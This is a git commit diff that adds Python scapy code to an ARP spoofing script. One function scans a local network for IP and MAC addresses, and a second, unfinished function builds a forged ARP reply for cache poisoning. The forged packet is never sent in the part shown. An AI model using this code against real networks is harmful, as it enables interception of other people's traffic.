bd48f737a8d4a53408ca63a38d97672bae66f7a5
wizardxxdx <101555271+wizardxxdx@users.noreply.github.com>
2022-07-07 02:05:19 -0700

    updating arp_spoof

--- arp_spoof.py
+++ arp_spoof.py
@@ -2,3 +2,19 @@
 
 import scapy.all as scapy
 
+def scan(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    client_list = []
+
+    for data in answered_list:
+        client_dict = {"ip": data[1].psrc, "mac": data[1].hwsrc}
+        client_list.append(client_dict)
+    return client_list
+
+
+def spoof(target_ip, spoof_ip):
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="", psrc=spoof_ip)
